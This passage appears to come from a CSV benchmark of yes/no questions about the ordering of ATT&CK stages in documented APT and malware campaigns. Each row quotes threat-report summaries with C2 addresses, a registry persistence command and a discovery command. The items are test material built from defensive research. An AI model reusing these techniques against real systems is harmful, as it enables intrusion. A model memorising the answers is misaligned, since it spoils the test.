Others: The attackers targeted over 130 organizations in more than 30 countries, focusing on industrial, engineering, and manufacturing sectors. The campaign, traced back to March 2015, seemed financially motivated. The attackers were particularly active in the Middle East, with a significant number of victims located in the United Arab Emirates. Phishing pages and links were also used, with victims connecting from various devices including Windows, Mac OS X, Ubuntu, iPhone, and Android. Kaspersky Lab detected the malware using heuristic signatures and provided a list of indicators of compromise, including filenames, paths, MD5 hashes, domains, and phishing URLs related to the malware.",Yes,Operation Ghoul_ targeted attacks on industrial and engineering organizations - Securelist
2752,73,73-Execution-T1059-Command and Scripting Interpreter,"After spoofing various banks in CIS countries to deliver a phishing email containing a ZIP archive named dog.zip, is it likely that the SOCKSBOT infection chain will establish persistence by using the PowerShell script setup.ps1 and later utilize checkupdate.ps1 containing a PowerShell reflective loader script for further execution?","Execution: The infection chain began with a JavaScript dropper delivered via a ZIP archive named dog.zip, containing a JavaScript file with heavily obfuscated code. Once deobfuscated, the code searched for antivirus processes and dropped a PowerShell script named setup.ps1, which established persistence and used a modified version of the Invoke-EventVwrBypass function from the Empire Post-exploitation framework to bypass UAC. A second-stage PowerShell script named checkupdate.ps1 was also used, containing a PowerShell reflective loader script with a DLL binary embedded as Base64-encoded data.","Initial Access: iDefense analysts reported two spear-phishing campaigns in October 2017 involving the malware family SOCKSBOT, spoofing Halyk Bank and PrivatBank. The phishing emails contained identical messages and hyperlinks, suggesting the use of a phishing kit. The campaign spoofed various banks in CIS countries, including Halyk Bank, PrivatBank, Idea Bank, and Tejara Bank, with the most recent observed on May 28, 2018.
Persistence: The PowerShell script setup.ps1 created a cmdlet to establish persistence by creating a Windows service named 'Check for updates' set to 'delay-auto' start and execute checkupdate.ps1. Additionally, a dropper executable binary was used to reflectively load SOCKSBOT into a chosen process, ensuring persistence by creating copies of itself in system directories and spoofing legitimate services with similar names.
Defense Evasion: The SOCKSBOT implant, delivered as a Base64-encoded string, was reflectively loaded in a newly started svchost.exe process, existing only in memory and never touching the disk. It used the ObtainUserAgentString API to determine the default user-agent of the machine and communicated with the C2 server using a pseudo-randomly generated URI.
Command and Control: The SOCKSBOT implant communicated with C2 servers using sockets and specific HTTP status codes to perform actions such as creating new sockets, enumerating processes, taking screenshots, and performing file operations. Three different C2 servers were observed: 5.8.88[.]64, 46.166.163[.]243, and 5.135.73[.]113.
Others: The Goldfin campaign, using SOCKSBOT, targeted financial institutions in CIS countries for financial gain. The campaign is not believed to be associated with CANDLEFISH but has infrastructure overlap and shared use of a PowerShell obfuscation technique with FIN7. Domains used in the campaign had identical WHOIS information and network hosting overlap with domains associated with FIN7. The campaign also used a variant of a PowerShell obfuscation technique similar to PowerSploit, previously observed in malware associated with FIN7. Mitigation recommendations include blocking access URIs and IP addresses associated with the campaign, and verifying the existence of artifacts such as randomly named files in system directories, a service named 'Check for updates', and a svchost.exe process without wininit.exe as the parent process.",Yes,Accenture-Goldfin-Security-Alert-1
2764,76,76-Resource Development-T1585-Establish Accounts,"Before the Dragonfly attackers created user accounts for stealthy operations within victim networks, is it likely that they performed reconnaissance using spear-phishing emails, watering holes, and supply-chain technology exploits?",Resource Development: The Dragonfly attackers created or gained user accounts to operate stealthily within victim networks. They used remote-desktop protocol to hop among systems and connect to control servers or internal compromised servers for operations.,"Reconnaissance: The Dragonfly campaign conducted reconnaissance before exploiting compromised targets, carefully considering each target. They used spear-phishing emails, watering holes, and supply-chain technology exploits to gather information.
Initial Access: The Dragonfly campaign targeted energy companies around the world by leveraging spear-phishing emails that allowed attackers to download Trojan software, providing access to the victims' systems and networks.
Execution: The Dragonfly campaign used backdoor malware embedded within trusted software to execute code on victims' machines without detection, leaving no trace on disk.
Persistence: Once the attackers gained a foothold, they created or gained user accounts to maintain access to victim networks and used remote-desktop protocol for movement.
Defense Evasion: The Dragonfly attackers incorporated code from the legitimate application TeamViewer into their backdoor to avoid detection and in-memory execution. They also used self-deleting code to remove traces of their presence.
Discovery: The Dragonfly group focused on Windows systems and used well-known practices to gather information and credentials.
Lateral Movement: The Dragonfly attackers used the remote-desktop protocol to move laterally among internal or external systems within victim networks.
Impact: The Dragonfly group has the ability to take offensive disruptive and destructive action, as seen in the 2015 attack on the Ukrainian power grid by a BlackEnergy malware family.
Others: The Dragonfly campaign has evolved since 2014, showing increased sophistication and precision in attacks. The group is likely after intellectual property or insights into the targeted sectors. McAfee Labs and the Advanced Threat Research team have uncovered related attacks targeting the pharmaceutical, financial, and accounting industries. The campaign has links to earlier attacks, with code reuse from the 2013 TeamSpy campaign and similarities to the BlackEnergy malware. McAfee Labs thanks Intezer for their assistance during the research.",Yes,Operation_Dragonfly_Analysis
2790,79,79-Discovery-T1057-Process Discovery,"After the XAgent app executes by hiding its icon and running in the background on iOS 7 devices, is it likely that the app will collect a list of processes for discovery before sending the gathered information, including the processes data, out via HTTP to the C2 server?",Discovery: The app is designed to collect all kind of information on an iOS device. It is able to perform the following routines:  Collect text messages Get contact lists Get pictures Collect geo-location data Start voice recording Get a list of installed apps Get a list of processes Get the Wi-Fi status,"Initial Access: In our continued research on Operation Pawn Storm, we found one interesting poisoned pawn   The iOS malware we found is among those advanced malware. We believe the iOS malware gets installed on already compromised systems, and it is very similar to next stage SEDNIT malware we have found for Microsoft Windows systems.
Execution: The XAgent app is fully functional malware. After being installed on iOS 7, the app's icon is hidden and it runs in the background immediately. When we try to terminate it by killing the process, it will restart almost immediately.  Installing the malware into an iOS 8 device yields different results. The icon is not hidden and it also cannot restart automatically. This suggests that the malware was designed prior to the release of iOS 8 last September 2014.
Command and Control: Besides collecting information from the iOS device, the app sends the information out via HTTP. It uses POST request to send messages, and GET request to receive commands.  The malware's log messages are written in HTML and color coded, making it easier for human operators to read. Error messages tend to be in red, while others are in green as shown in the figure below.  The full uniform resource identifier (URI) for C&C HTTP requests is randomly generated, according to a template agreed upon with the C&C server. The base URI can be seen in Figure 4, and parameters are chosen from the list below and appended to the base URI.  The malware uses a token to identify which module is communicating. The token is Base64 encoded data, but padded with a 5-byte random prefix so that it looks like valid Base64 data. See the first line ""ai="" part in the figure below.  Reverse engineering also revealed additional communication functions.  The app is also able to upload files via FTP protocol.",Yes,PawnStorm_iOS
2809,81,81-Execution-T1129-Shared Modules,"After obtaining SSH access to the target system and using wget to fetch the malware samples, is it likely that the Turbo Linux Kernel Module will be dropped to disk, loaded into the kernel, and subsequently deleted by the Derusbi malware to avoid detection?","Execution: Upon execution, the custom loader loads the Derusbi malware into memory. Derusbi then drops the Turbo Linux Kernel Module to disk, loads it into the kernel, and deletes it from disk to avoid detection. The client uses Turbo to hide relevant user space processes.","Initial Access: The adversary obtained SSH access to the target system, a large public research institution in the United States, and used the GNU utility wget to fetch malware samples from the IP address 175.45.250.xxx. The malware binary downloaded had a date string in its naming convention that matched the day it was downloaded, suggesting it was compiled on that day, indicating active developer involvement.
Persistence: The Turbo Linux Kernel Module (LKM) provides persistence by hiding processes, making detection of the attacker's malicious applications more difficult when running on the victim's system.
Defense Evasion: The Derusbi malware and Turbo kernel module employ cloaking and anti-analysis techniques. The Turbo LKM is loaded into kernel space to modify the system's global call table, particularly pertaining to process IDs (PIDs), allowing user space applications to hide and unhide any process. Additionally, the LKM disables the CPU's control register zero's (CR0) write protection to modify the system call table.
Discovery: The Derusbi malware gathers information about the victim host, including the local host name, GCC version, and system information, which is transferred back to the command and control infrastructure via network beacons.
Command and Control: The malware binds to a raw socket on a random source port between 31800 and 31900 and beacons to the preconfigured destination port 443. The traffic is not SSL/TLS encrypted. A backup communication method with HTTP beacon is used, with content obfuscated using variable 4-byte XOR keys. The C2 interactions include HTTP POST requests to /photos/photo.asp and responses from the server.",Yes,TA_Fidelis_Turbo_1602_0
2822,83,83-Command and Control-T1132-Data Encoding,"After BlackSoul gathers browser data, including usernames and passwords from the victim's machine, is it likely to perform file transfers and execute commands from its C2 server before communicating with the C2 server over the RESTful Strapi protocol with JSON-based data encoding?",Command and Control: BlackSoul communicates with the C2 server over the RESTful Strapi protocol and JSON-based data encoding. It uses Cloudflare Workers Service (*.workers[.]dev) to host C2 infrastructure and supports DNS-over-HTTPS (DoH) using cloudflare-dns.com.,"Initial Access: On November 27, QuoIntelligence detected a new malware campaign that likely originated with a spear phishing email delivering a CAB archive named 1-10-20-hb44_final, impersonating a document from the National Institute of Standards and Technology (NIST) website. The campaign is attributed to the threat actor ReconHellcat and delivers a previously undocumented remote access Trojan (RAT) named BlackSoul.
Execution: The malware campaign involved a malicious loader named 1-10-20-hb44_final.exe, which uses obfuscation techniques similar to those observed in previous ReconHellcat campaigns delivering BlackWater malware. The loader utilizes C2 infrastructure hosted on the Cloudflare Workers service to retrieve two files: an executable named blacksoul and a Dynamic-Link Library (DLL) named blacksoulLib. The loader also opens a legitimate document from the NIST website as a decoy.
Defense Evasion: BlackSoul uses various obfuscation techniques, including dynamic string construction on the stack and deobfuscation with fixed key XOR cipher and Caesar cipher using variable shift values. The malware's string obfuscation applies only to strings in the main program but excludes strings of third-party compiled-in libraries.
Credential Access: The DLL named blacksoulLib, which is called by BlackSoul, searches the victim's machine for Firefox, Chrome, and Opera data. If browser data is not found, the program terminates early. It also decodes a C2 URL and a Cloudflare DNS-over-HTTPS (DoH) URL, generates further login information for the C2, and returns gathered data to BlackSoul in JSON format, including a username with three random appended characters and a password consisting of 24 random characters.
Collection: BlackSoul is capable of file transfers and running arbitrary commands. It supports handling commands from its C2 server for executing commands and returning results, downloading files from a URL and storing them on the machine, retrieving specified files from the machine and uploading them to the C2, and updating the configuration file (UsrClass.json) which contains C2 server info and miscellaneous fields.
Exfiltration: BlackSoul is capable of exfiltrating data over the C2 channel and supports automated exfiltration.",Yes,quointelligence.eu-ReconHellcat Uses NIST Theme as Lure To Deliver New BlackSoul Malware
2831,85,85-Execution-T1203-Exploitation for Client Execution,"After the Internet Explorer zero-day exploit is identified by FireEye Research Labs, is it likely that the zero-day exploit prepares the heap with a Flash SWF file before bypassing Windows' ASLR and DEP protections and executing shellcode that downloads the next stage payload?","Execution: FireEye Research Labs identified a new Internet Explorer (IE) zero-day exploit used in targeted attacks. The exploit leverages a previously unknown use-after-free vulnerability, and uses a well-known Flash exploitation technique to achieve arbitrary memory access and bypass Windows' ASLR and DEP protections. The exploit involves preparing the heap with a Flash SWF file, triggering the IE bug via Javascript, and using corrupted Flash vector objects for memory access. Runtime ROP generation is used to search for specific APIs and construct a ROP chain, which is then used to execute shellcode that makes memory executable and clears debug registers, possibly to bypass EMET's EAF mitigation. The shellcode also downloads the next stage of the payload.","Defense Evasion: The zero-day exploit bypasses both Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). The exploit also attempts to bypass protections that use hardware breakpoints, such as EMET's EAF mitigation, by searching for and using specific APIs and gadgets during runtime ROP generation.
Others: The vulnerability, identified as CVE-2014-1776, affects IE6 through IE11, but the attack is targeting IE9 through IE11. Microsoft has released a security advisory to track this issue. The threat actors are actively using this exploit in an ongoing campaign named 'Operation Clandestine Fox.' The vulnerable versions of IE represent about a quarter of the total browser market. Mitigation measures include using EMET, which may break the exploit, and Enhanced Protected Mode in IE. Additionally, the attack will not work without Adobe Flash, so disabling the Flash plugin within IE will prevent the exploit from functioning. The APT group responsible for this exploit has a history of accessing browser-based 0-day exploits and is proficient at lateral movement without reusing command and control infrastructure. They have used backdoors like Pirpi in the past.",Yes,Op_Clandestine_Fox
2838,86,86-Command and Control-T1573-Encrypted Channel,"After discovering system information using the command 'cmd.exe /c tasklist & systeminfo' and sending it to '45.124.132.127', is it likely that the malware will establish an HTTPS communication with the command and control server before contacting the domain 'marina-info.net' for further operations?","Command and Control: The malware contacts the command and control server using HTTPS communication with a POST method. Another file, 'sdbn.dll', contacts the domain 'marina-info.net', which is a reference to the Italian Marina Militare. The domain resolves to the IP '191.101.31.250' located in Holland. The communication is managed with a script written in the AutoIt language, embedded in the 'upnphost.exe' file as a resource.","Initial Access: Recently, a new series of malware samples were submitted to major online sandboxes, with one sample submitted to Virus Total attributed to the Russian APT28 group. The attack analyzed is multi-stage, with an initial dropper malware written in Delphi programming language downloading a second stage payload from the internet and executing it. The payload communicates with the server using the HTTPS protocol.
Execution: The malware initiates contact with the command and control server, downloading the file 'upnphost.exe' to the path '%APPDATA%\Local\Temp', which is likely the final payload. The executable implements a persistence mechanism by setting a registry key.
Persistence: The executable 'upnphost.exe' implements a persistence mechanism by setting a registry key to maintain its foothold on the system.
Defense Evasion: The 'upnphost.exe' file was submitted to Virus Total, likely due to the evasion technique implemented by the dropper. To analyze the dropper, it was patched, revealing the complete malicious behavior of the malware.
Discovery: The malware sends information gathered on the operating system to the IP '45.124.132.127' using the command line 'cmd.exe /c tasklist & systeminfo'. The server is located in Hong Kong according to WHOIS records.
Others: The attack threat map indicates the attack surface covered by the hacker group is wide, with C2Cs in Europe and China. Yara rules are provided for the dropper, first payload 'upnphost.exe', and second payload 'sdbn.dll' associated with APT28 XAGENT July 2018.",Yes,20180713_CSE_APT28_X-Agent_Op-Roman Holiday-Report_v6_1
2841,87,87-Execution-T1203-Exploitation for Client Execution,"Following the initial access achieved through weaponized RTF documents exploiting CVE-2012-0158 to drop an embedded downloader file, is it likely that the MSIL/Crimson malware will execute on the victim's machine and attempt to download the full RAT component from 213.136.87[.]122:10001 before establishing command and control using a custom TCP protocol?","Execution: After successful exploitation and decoding of the embedded payload, a family of malware referred to as MSIL/Crimson is executed on the victim's machine. The first stage is a downloader whose purpose is to download the more fully featured RAT component. The MSIL/Crimson downloader attempts to download the full RAT from 213.136.87[.]122:10001.","Initial Access: On February 11, 2016, two malicious emails were sent minutes apart to officials at Indian embassies in Saudi Arabia and Kazakhstan from the same originating IP address (5.189.145[.]248) belonging to Contabo GmbH. Both emails carried the same attachment, a weaponized RTF document exploiting CVE-2012-0158 to drop an embedded, encoded portable executable (PE) named svchost.exe with downloader functionality.
Command and Control: The MSIL/Crimson malware utilizes a custom TCP protocol for communicating with its command and control (C&C) servers. Some of its modules, which lack C&C capability, rely on the RAT component for information exfiltration.
Others: Proofpoint researchers uncovered an advanced persistent threat (APT) against Indian diplomatic and military resources, which they have dubbed 'Operation Transparent Tribe.' The investigation began with malicious emails and uncovered connections to watering hole sites designed to drop a remote access Trojan (RAT) with data exfiltration functions. The campaigns and attacks appear related by common indicators of compromise (IOCs), vectors, payloads, and language. The exact nature and attribution of this APT remain under investigation. The MSIL/Crimson malware family is modular, with additional payloads downloaded by the main RAT module often utilized for functions such as keylogging and browser credential theft. Infections typically occur in stages, with the first stage being a downloader component. Crimson-infected victims may be spied on via invasive methods such as through their webcam, stealing email from Outlook, and recording their screen. Some variants support at least 40 individual commands. The technical analysis section provides a full description and analysis of the MSIL/Crimson malware family.",Yes,transparent-tribe-threat-insight-en2020
2857,89,89-Credential Access-T1003-OS Credential Dumping,"After scanning the corporate internal network for hosts with open ports 8080, 5900, and 40 to identify potential expansion points, is Suckfly likely to use a signed credential-dumping tool to obtain account credentials before using hacktools to move laterally within the e-commerce company's internal network?",Credential Access: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials.,"Initial Access: Suckfly exploited a vulnerability on the targeted employee's operating system (Windows) that allowed the attackers to bypass the User Account Control and install the Nidiran back door to provide access for their attack. While the delivery vector is unknown, a spear-phishing email may have been used due to the target's extensive open-source presence.
Execution: Suckfly used the Nidiran back door along with a number of hacktools to infect the victim's internal hosts. The tools and malware used in this breach were also signed with stolen digital certificates.
Privilege Escalation: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials, allowing them to navigate the internal corporate network as though they were the employee.
Defense Evasion: Suckfly made its malware difficult to analyze to prevent their operations from being detected. The malware checks for an internet connection before running and attempts to communicate with the C&C domain over ports 443 and 8443.
Discovery: Suckfly scanned the corporate internal network for hosts with ports 8080, 5900, and 40 open, looking to expand its foothold on the e-commerce company's internal network.
Lateral Movement: Suckfly used hacktools to move laterally and escalate privileges within the e-commerce company's internal network.
Command and Control: Suckfly's Nidiran back door communicated with the C&C domains, sending encrypted and hardcoded information including the network name, hostname, IP address, and the victim's operating system information.
Exfiltration: Suckfly's final step was to exfiltrate data off the victim’s network and onto Suckfly’s infrastructure using the Nidiran back door. The extent of stolen information is unknown.
Others: Suckfly conducted long-term espionage campaigns against government and commercial organizations in India, targeting high-profile entities such as government networks, a large e-commerce company, and its primary shipping vendor, one of India's top five IT firms, a US healthcare provider's Indian business unit, and two government organizations. The attacks were part of a planned operation against specific targets in India, with the government organizations showing a higher infection rate. Suckfly's activities suggest it is a professional organized group, operating Monday through Friday, and likely providing economic insight to the organization behind its operations. Symantec has detections in place to protect against Suckfly's malware.",Yes,indian-organizations-targeted-suckfly-attacks
2859,89,89-Lateral Movement-T1570-Lateral Tool Transfer,"After scanning the corporate internal network for hosts with specific open ports, is it likely that Suckfly will use hacktools to transfer malware laterally across the e-commerce company's internal network before the Nidiran back door communicates the victim’s network details to the C&C domains?",Lateral Movement: Suckfly used hacktools to move laterally and escalate privileges within the e-commerce company's internal network.,"Initial Access: Suckfly exploited a vulnerability on the targeted employee's operating system (Windows) that allowed the attackers to bypass the User Account Control and install the Nidiran back door to provide access for their attack. While the delivery vector is unknown, a spear-phishing email may have been used due to the target's extensive open-source presence.
Execution: Suckfly used the Nidiran back door along with a number of hacktools to infect the victim's internal hosts. The tools and malware used in this breach were also signed with stolen digital certificates.
Privilege Escalation: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials, allowing them to navigate the internal corporate network as though they were the employee.
Defense Evasion: Suckfly made its malware difficult to analyze to prevent their operations from being detected. The malware checks for an internet connection before running and attempts to communicate with the C&C domain over ports 443 and 8443.
Credential Access: Suckfly used a signed credential-dumping tool to obtain the victim's account credentials.
Discovery: Suckfly scanned the corporate internal network for hosts with ports 8080, 5900, and 40 open, looking to expand its foothold on the e-commerce company's internal network.
Command and Control: Suckfly's Nidiran back door communicated with the C&C domains, sending encrypted and hardcoded information including the network name, hostname, IP address, and the victim's operating system information.
Exfiltration: Suckfly's final step was to exfiltrate data off the victim’s network and onto Suckfly’s infrastructure using the Nidiran back door. The extent of stolen information is unknown.
Others: Suckfly conducted long-term espionage campaigns against government and commercial organizations in India, targeting high-profile entities such as government networks, a large e-commerce company, and its primary shipping vendor, one of India's top five IT firms, a US healthcare provider's Indian business unit, and two government organizations. The attacks were part of a planned operation against specific targets in India, with the government organizations showing a higher infection rate. Suckfly's activities suggest it is a professional organized group, operating Monday through Friday, and likely providing economic insight to the organization behind its operations. Symantec has detections in place to protect against Suckfly's malware.",Yes,indian-organizations-targeted-suckfly-attacks
2862,9,9-Defense Evasion-T1027-Obfuscated Files or Information,"After the malicious 32-bit CCleaner binary from version 5.33 redirected execution to the malicious code and decrypted the two-stage payload during execution, is it likely that the malware payload attempted to evade detection by zeroing out the IMAGE_DOS_HEADER and modifying CBkdr.dll to avoid detection before establishing a Command and Control channel using an HTTPS POST request with system information?","Defense Evasion: The malware payload within CCleaner 5.33 attempted to evade detection by zeroing out the IMAGE_DOS_HEADER and using a valid digital signature. The malicious DLL file, CBkdr.dll, was modified to avoid detection, and the DLLEntryPoint created an execution thread to return control to the loader. This thread was responsible for calling CCBkdr_GetShellcodeFromC2AndCall and setting up a Return Oriented Programming (ROP) chain to deallocate memory associated with the DLL and exit the thread.","Initial Access: The CTI report from September 18, 2017, authored by Edmund Brumaghin and others from Cisco's Talos Intelligence Group, details a supply chain attack where the download servers of the software vendor Avast were compromised to distribute a malicious version of CCleaner. The affected version, CCleaner 5.33, released on August 15, 2017, contained a multi-stage malware payload. The 32-bit CCleaner binary included in the installer had been modified to execute malicious code before proceeding with the normal CCleaner operations. This version was hosted on CCleaner's download server until September 11, 2017, and was signed with a valid certificate issued to Piriform Ltd by Symantec, valid through October 10, 2018. A second malicious sample was also discovered, signed approximately 15 minutes after the first one.
Execution: The malicious 32-bit CCleaner binary from the installer for version 5.33 was modified to call to the code at CC_InfectionBase(0x0040102C), redirecting code execution flow to the malicious code. This initiated the decryption of data containing two stages of the malicious payload: a Position Independent Code (PIC) PE loader and a DLL file functioning as the malware payload. The malware author attempted to evade detection by zeroing out the IMAGE_DOS_HEADER. The binary created an executable heap, copied the decrypted malware to it, and then called the PE loader to begin its operation. After initiating the infection process, the binary erased the memory regions containing the PE loader and the DLL file, destroyed the heap, and continued with normal CCleaner operations.
Command and Control: The malware established a Command and Control (C2) channel by encrypting and encoding system information using modified Base64, then transmitting it via an HTTPS POST request to 216[.]126[.]225[.]148. The communications leveraged a hardcoded HTTP Host header set to speccy[.]piriform[.]com and ignored security errors from the server's self-signed SSL certificate. If no response was received from the C2 server, the malware fell back to a Domain Generation Algorithm (DGA). The malware stored the C2 IP address and the current system time plus two days in the registry at HKLM\SOFTWARE\Piriform\Agomo:NID and HKLM\SOFTWARE\Piriform\Agomo:TCID, respectively.
Impact: The impact of the attack could be severe due to the high number of systems potentially affected. CCleaner claimed over 2 billion downloads worldwide as of November 2016. Affected systems needed to be restored to a state before August 15, 2017, or reinstalled, and users were advised to update to the latest version of CCleaner, which at the time of the report was version 5.34.
Others: The CTI report includes additional information about the investigation and response to the threat. Cisco Talos released ClamAV signatures 6336251 and 6336252 to detect the threat. Advanced Malware Protection (AMP), Cisco's Web Security Appliance (WSA), AMP Threat Grid, and Umbrella were recommended for protection against the threat. Indicators of Compromise (IoCs) were provided, including file hashes, DGA domains, and IP addresses. The report also noted that antivirus detection for this threat was low at the time of writing.",Yes,CCleanup
2874,91,91-Command and Control-T1071-Application Layer Protocol,"After the Bisonal dropper sets up persistence by creating a registry entry to execute the decrypted DLL payload upon system reboot, is it likely that the Bisonal variant will communicate with its C2 addresses by sending an HTTP POST request for command and control operations?","Command and Control: The Bisonal variant used in the latest attack communicates with C2 addresses using the HTTP POST method. When this Bisonal variant communicates with its C2, the malware sends an HTTP POST request with static strings and the IP address of the compromised machine. The malware sends hardcoded DWORD values (0x10000 and 0x3E7) just for the initial connection and receives updated values from the C2 and uses them for further communication. All communications between this Bisonal variant and C2 are encrypted by the RC4 cipher with the static key ""78563412"". The backdoor always sends identical eight bytes of data (81b2a8977ea31b91) to the C2 first. The C2 replies with a session id number and backdoor command, which is consistent throughout the C2 communication. The malware then processes the given command on the compromised system and sends the result back to C2 with the session id number and the backdoor command number. The C2 replies with that same session id number. The backdoor waits five seconds and restarts communication with the C2 with the same session id number.","Initial Access: In early May, Unit 42 discovered an attack campaign against at least one defense company in Russia and one unidentified organization in South Korea delivering a variant of Bisonal malware. The adversary behind these attacks lured the targets into launching the Microsoft Windows executable malware by masquerading it as a PDF file (using a fake PDF icon) and reusing publicly available data for the decoy PDF file's contents. The spear-phishing email sent to the target organization was spoofed to look like it was sent from Rostec, a Russian state corporation. The email included project details aimed at improving the housing conditions of defense industry workers. The malicious executable attachment, once opened, dropped the main payload on the victim machine and displayed a decoy file to the victim, which matched an article published on Rostec's website on January 30, 2018.
Persistence: The dropper executable file in the Russian attack hides the encrypted Bisonal DLL file and non-malicious decoy file at the end of its body. Once executed, the dropper decrypts the data blob using the RC4 cipher with the key, ""34123412"", saves them in the path shown below and executes them. The dropper then creates the following registry entry to execute the Bisonal sample when the computer reboots: HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez""
Defense Evasion: The Bisonal malware in the Russian attack used a different cipher for C2 communication than other publicly documented samples. It employs the RC4 cipher with the key ""78563412"" for encrypting C2 address strings. The malware variant communicates with one of the following hard-coded C2 addresses by using the HTTP POST method on TCP port 443: kted56erhg.dynssl[.]com and euiro8966.organiccrap[.]com, both resolving to the same IP address, 116.193.155[.]38. The initial HTTP POST request to the C2 server contains static strings ""ks8d"" and ""akspbu.txt"", and the IP address of the compromised machine. The User Agent request header is incomplete, which can be a good indicator in network logs for a possible Bisonal infection.",Yes,bisonal-malware-used-attacks-russia-south-korea
2887,93,93-Collection-T1005-Data from Local System,"After employing evasion techniques, such as mixing junk code and basic anti-sandbox detection for defense evasion, is the 'yty' framework likely to utilize plugins like 'vstservice.exe', 'mdriver.exe', or 'dspcheck.exe' for document listing, keylogging, and screenshot collection before exfiltrating data to the C2 server using 'abode.exe'?","Collection: The 'yty' framework is capable of file collection, screenshots, and keylogging. It includes plugins such as 'vstservice.exe' for document listing, 'abode.exe' for file exfiltration, 'mdriver.exe' for keylogging, 'dspcheck.exe' for taking screenshots, and 'mboard.exe' for system information gathering.","Initial Access: The ASERT team discovered a new modular malware framework named 'yty' which uses a malicious Excel document named 'Circular.xls' as part of its initial access strategy. The document contains an executable extracted and executed by macros. The delivery mechanism for the XLS file is unknown, but it may be a test document.
Execution: The 'yty' framework includes a stripped-down C++ program named '.exe' (Downloader 1) that downloads and executes another executable, then removes itself. Another component, 'Setup.exe' (Downloader 2), is a more functional downloader that checks for a single instance and includes anti-sandbox detection.
Persistence: A secondary macro in 'Circular.xls' establishes persistence for the 'Setup.exe' download.
Defense Evasion: The 'yty' framework employs evasion techniques such as mixing in junk code and basic anti-sandbox detection to avoid analysis. It also creates logs for debugging purposes, which is similar to the EHDevel framework.
Command and Control: The 'yty' framework uses a football-themed communication strategy to disguise its traffic. It downloads a file from Google Docs to get its C2 host and sends beacon messages containing system information. The C2 server responds with instructions for further actions.
Exfiltration: The 'yty' framework exfiltrates data such as file listings, keystrokes, and screenshots back to the C2 server using plugins like 'abode.exe'.
Others: The Donot Team, believed to be behind the 'yty' framework, mimics legitimate applications and services to disguise their operations. They use domains with slight alterations from legitimate ones and rely heavily on subdomains for their infrastructure. The team's TTPs, infrastructure, and malware code are similar to the EHDevel malware reported by BitDefender, suggesting they are the same group of operators. The evolution from EHDevel to 'yty' indicates the threat actors are continually improving their malware framework.",Yes,Donot Team in South Asia
2895,93,93-Exfiltration-T1020-Automated Exfiltration,"After employing its plugins like 'vstservice.exe' for document listing, 'mdriver.exe' for keylogging, and 'dspcheck.exe' for capturing screenshots, is it likely that the 'yty' framework exfiltrates gathered data such as file listings, keystrokes, and screenshots back to the C2 server using automated methods described in its exfiltration mechanism?","Exfiltration: The 'yty' framework exfiltrates data such as file listings, keystrokes, and screenshots back to the C2 server using plugins like 'abode.exe'.","Initial Access: The ASERT team discovered a new modular malware framework named 'yty' which uses a malicious Excel document named 'Circular.xls' as part of its initial access strategy. The document contains an executable extracted and executed by macros. The delivery mechanism for the XLS file is unknown, but it may be a test document.
Execution: The 'yty' framework includes a stripped-down C++ program named '.exe' (Downloader 1) that downloads and executes another executable, then removes itself. Another component, 'Setup.exe' (Downloader 2), is a more functional downloader that checks for a single instance and includes anti-sandbox detection.
Persistence: A secondary macro in 'Circular.xls' establishes persistence for the 'Setup.exe' download.
Defense Evasion: The 'yty' framework employs evasion techniques such as mixing in junk code and basic anti-sandbox detection to avoid analysis. It also creates logs for debugging purposes, which is similar to the EHDevel framework.
Collection: The 'yty' framework is capable of file collection, screenshots, and keylogging. It includes plugins such as 'vstservice.exe' for document listing, 'abode.exe' for file exfiltration, 'mdriver.exe' for keylogging, 'dspcheck.exe' for taking screenshots, and 'mboard.exe' for system information gathering.
Command and Control: The 'yty' framework uses a football-themed communication strategy to disguise its traffic. It downloads a file from Google Docs to get its C2 host and sends beacon messages containing system information. The C2 server responds with instructions for further actions.
Others: The Donot Team, believed to be behind the 'yty' framework, mimics legitimate applications and services to disguise their operations. They use domains with slight alterations from legitimate ones and rely heavily on subdomains for their infrastructure. The team's TTPs, infrastructure, and malware code are similar to the EHDevel malware reported by BitDefender, suggesting they are the same group of operators. The evolution from EHDevel to 'yty' indicates the threat actors are continually improving their malware framework.",Yes,Donot Team in South Asia
2901,95,95-Initial Access-T1133-External Remote Services,"After APT15 used Mimikatz to obtain domain administrator credentials and stole a VPN certificate to access the network remotely, is it likely that APT15 deployed backdoors such as BS2005, RoyalCLI, and RoyalDNS while leveraging RoyalCLI to bypass command prompt policy settings for execution?","Initial Access: The attackers operated within the victim's network from May 2016 until late 2017, compromising over 30 hosts during that period. APT15 targeted a global company that provides multiple services to the UK government, seeking information related to UK government departments and sensitive communication technology. They gained domain administrator credentials using Mimikatz and stole a VPN certificate to access the network remotely.","Execution: APT15 deployed three backdoors: BS2005, previously documented by FireEye, and two new backdoors, RoyalCLI and RoyalDNS. RoyalCLI bypasses policy settings that disable command prompt by copying and patching cmd.exe. RoyalDNS uses DNS to take commands, execute them, and return output, differing from the other backdoors by installing persistently and communicating over DNS rather than HTTP.
Persistence: The RoyalDNS backdoor installs itself persistently on the victim's network.
Privilege Escalation: APT15 used Mimikatz to gain domain administrator credentials, which facilitated further actions within the network.
Defense Evasion: RoyalCLI backdoor evades policy settings that disable command prompt execution by copying and patching cmd.exe.
Credential Access: APT15 used Mimikatz to obtain domain administrator credentials and stole a VPN certificate for remote network access.
Collection: APT15 used tools like CSVDE to export data from Microsoft Windows Active Directory and BCP from Microsoft SQL to export data from databases. They also used bespoke tools to extract information from Microsoft Sharepoint and Microsoft Exchange, with the Sharepoint tool containing hardcoded project names specific to the victim.
Others: NCC Group tracked APT15's movements over more than a year by decoding over 200 commands from several compromised hosts. Ahmed Zaki, a senior malware researcher at NCC Group, highlighted the sophistication of APT15 and the importance of knowledge sharing in the security industry. The article was published on 10 March 2018.",Yes,New tools uncovered from hacking group APT15
